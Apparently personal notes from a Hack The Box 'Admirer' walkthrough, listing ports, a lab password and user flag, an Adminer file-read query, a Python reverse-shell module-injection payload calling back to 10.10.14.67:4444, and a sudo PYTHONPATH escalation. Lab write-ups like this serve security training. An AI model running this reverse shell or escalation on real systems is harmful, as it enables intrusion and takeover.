# Basic
```
* Name: Admirer
* IP: `export IP=10.10.10.187`
* Box: Linux 
* Level: Easy
* Released: 02-May-2020
```

# Flags
```
* User:178fcc965a72ac0ff14bdc302460ca23
* Root:
```

# Creds

``` * waldo : &<h5b~yK3F#{PaPB&dA}{H> ```

# User exploit

  ## Ports

  ```
  * 21 vsftpd 3.0.3
  * 22 openssh
  * 80 apache 2.4.35 ( No exploit )
  ```

  ## Web site

  ```
  * Found admin-dir in robots.txt
  * Found credentials.txt, contacts.txt in admin-dir
  * Logged into ftp using credentials found in the file.
  ```

  ## Ftp

  ```
  * Found dump.sql
  * Found html tar file
      * Database: admirerdb
      * Database: Mariadb
      * admin_tasks.php ( Can execute shell command from this) INTERESTING
      
  ```

  ## Usernames

  ```
  * waldo

  ```

  ## Fuzzing
  ```
  * /utility-scripts/adminer.php
  * https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool ( Exploit )
  
  ```
  ## Exploiting
  ```
  * Start a mysql database locally
  * Connect to it using adminer.php 
  * Run this command using sql command:
    `load data local infile /var/www/html/index.php
    into table test
    fields terminated by "\n"`
  * Found creds to db
  ```


# Root Exploit

  ## Linpeas
  ```
  /opt/scripts/backup.py is being run by root 
  ```
  
  # Exploit
  ```
  Python module injection

  Code:
  `import os
    import pty
    import socket

    def make_archive(a,b,c):
            pass

    lhost = "10.10.14.67"
    lport = 4444

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((lhost, lport))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    os.putenv("HISTFILE",'/dev/null')
    pty.spawn("/bin/bash")
    s.close()`
  ```

  # Sudo environment variable injection
  ```
  sudo PYTHONPATH=/tmp/test /opt/scripts/admin
  ```